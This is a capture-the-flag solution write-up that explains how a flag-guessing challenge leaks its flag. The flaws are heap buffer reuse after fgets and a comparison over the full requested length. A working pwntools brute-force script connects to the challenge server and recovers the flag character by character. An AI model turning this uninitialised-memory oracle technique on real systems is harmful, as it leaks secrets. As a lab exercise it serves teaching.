# Do You Still Feel Lucky? -- Solution

The user is given a seemingly impossible task of guessing the flag with useful feedback given when more than half the flag characters are guessed and again when all but two characters are guessed.


```c
void read_flag() {
  FILE* in;
  
  in = fopen("flag.txt", "rt");
  fgets(flag, 64, in);
  flag_length = strlen(flag);
  fclose(in);
}

void guess_flag() {
  int guess_length;
  char *guess;
  int ncorrect;
  int i;
  
  puts("Try to guess the flag!");
  puts("Enter the length of your guess:");
  scanf("%d", &guess_length);
  getchar();
  guess = malloc(guess_length);
  puts("Enter your guess:");
  fgets(guess, guess_length, stdin);

  ncorrect = 0;
  for (i=0; i<guess_length && i<flag_length; i++)
    if (guess[i] == flag[i])
      ncorrect++;

  if (ncorrect == flag_length)
    puts("Got it!");
  else if (ncorrect == flag_length-2)
    puts("Almost!");
  else if (ncorrect*2 >= flag_length)
    puts("Getting there!");
  else
    puts("Not even close.");
  
  free(guess);
}
```

Exploit is possible due to a bug in how the guess is read and compared to the flag, but also a bit of luck with the allocator:

1. With the provided libc, `fgets` will allocate (and subsequently free) heap memory to store the data read from the file -- the flag in our case. Later, when `malloc` is used to allocate memory for the guess, it will return the same heap address used by `fgets` that will *already contain the flag*.

2. If the user sends a string shorted than `guess_length`, the string is zero-terminated, but all the `guess_length` number of characters will be compared to the flag. Hence, as long as the user sends some *prefix* of the flag, the number of calculated number of correct characters will be `n-2` (all except newline and zero characters). 

Therefore, we can search the flag characters one by one always maintaining a correct prefix.

```python
#!/usr/bin/env python3

import string

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote( '0.cloud.chals.io', 25330)
    else:
        p = process('./chall')
    return p

def guess(k, s):
    p = conn()
    p.sendlineafter(b':\n', str(k).encode())
    p.sendlineafter(b':\n', s.encode())
    ret = p.recvline()
    p.close()
    return ret.strip().decode('ascii')
    
C = 'TBTL'
for i in range(60):
    next = None
    for x in string.printable:
        g = guess(64, C+x)
        print(C+x, g)
        if g == 'Got it!':
            print(C+x)
            exit()
        elif g[0] == 'A':
            next = x
            break 
    assert next
    C += x
```
